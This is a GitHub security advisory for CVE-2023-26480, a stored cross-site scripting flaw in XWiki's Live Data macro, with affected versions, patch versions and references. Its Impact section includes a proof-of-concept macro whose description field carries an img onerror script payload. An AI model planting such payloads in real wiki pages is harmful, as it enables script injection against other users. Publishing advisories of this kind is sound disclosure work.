# [H] XWiki-Platform vulnerable to stored Cross-site Scripting via the HTML displayer in Live Data

## Summary
Severity: High
Advisory: GHSA-32fq-m2q5-h83g
CVE: CVE-2023-26480
CWE: CWE-79
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2023-03-03
Source: https://github.com/advisories/GHSA-32fq-m2q5-h83g
Type: github-advisory

## Affected
- Maven: `org.xwiki.platform:xwiki-platform-livedata-macro` — affected >=12.10 <13.10.10
- Maven: `org.xwiki.platform:xwiki-platform-livedata-macro` — affected >=14.0 <14.4.7
- Maven: `org.xwiki.platform:xwiki-platform-livedata-macro` — affected >=14.5 <14.9

## Details
### Impact
A user without script rights can introduce a stored XSS by using the Live Data macro.

For instance:

```
{{liveData id="movies" properties="title,description"}}
{
  "data": {
    "count": 1,
    "entries": [
      {
        "title": "Meet John Doe",
        "url": "https://www.imdb.com/title/tt0033891/",
        "description": "<img onerror='alert(1)' src='foo' />"
      }
    ]
  },
  "meta": {
    "propertyDescriptors": [
      {
        "id": "title",
        "name": "Title",
        "visible": true,
        "displayer": {"id": "link", "propertyHref": "url"}
      },
      {
        "id": "description",
        "name": "Description",
        "visible": true,
        "displayer": "html"
      }
    ]
  }
}
{{/liveData}}
```

### Patches
This has been patched in XWiki 14.9, 14.4.7, and 13.10.10.

### Workarounds
No known workaround.

### References
https://jira.xwiki.org/browse/XWIKI-20143

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Jira](http://jira.xwiki.org/)
* Email us at [Security ML](mailto:security@xwiki.org)

## References
- https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-32fq-m2q5-h83g
- https://nvd.nist.gov/vuln/detail/CVE-2023-26480
- https://github.com/xwiki/xwiki-platform/commit/23d5ea9b23e84b5f3d1f1b2d5673fe8c774d0d79
- https://github.com/xwiki/xwiki-platform/commit/556e7823260b826f344c1a6e95d935774587e028
- https://github.com/xwiki/xwiki-platform
- https://jira.xwiki.org/browse/XWIKI-20143
